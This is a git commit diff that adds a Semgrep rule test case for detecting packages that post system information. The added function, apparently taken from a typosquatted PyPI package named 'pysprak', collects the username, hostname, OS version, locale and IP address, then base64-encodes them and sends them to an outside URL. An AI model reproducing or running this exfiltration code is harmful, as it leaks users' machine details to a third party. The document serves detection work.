76ae85d4b5972d97ec40f6add60a3c54ca10837d
Ellen Wang <ellen.wang@datadoghq.com>
2022-06-30 17:06:55 -0400

    feat: added test for post-systeminfo rule

--- semgrep_tests/post-systeminfo.py
+++ semgrep_tests/post-systeminfo.py
@@ -60,3 +60,28 @@ def detect():
     )
 
 detect()
+
+
+def checkVersion():
+    user_name = getpass.getuser()
+    hostname = socket.gethostname()
+    os_version = platform.platform()
+    if platform.system() is 'Windows':
+        import ctypes
+        import locale
+        dll_handle = ctypes.windll.kernel32
+        loc_lang = locale.getdefaultlocale()
+        language = ':'.join(loc_lang)
+    elif platform.system() is 'Linux':
+        loc_lang = os.popen("echo $LANG")
+        language = loc_lang.rea
+    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
+    package='pysprak'
+    vid = user_name+"###"+hostname+"###"+os_version+"###"+ip+"###"+package
+    if sys.version_info>(3,0):
+      # ruleid: post-systeminfo
+      request.urlopen(r'http://numipy.openvc.org/spark.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
+    elif sys.version_info<(3,0):
+      # ruleid: post-systeminfo
+      urllib.urlopen(r'http://numipy.openvc.org/spark.php','vid='+base64.encodestring(vid))
+checkVersion()
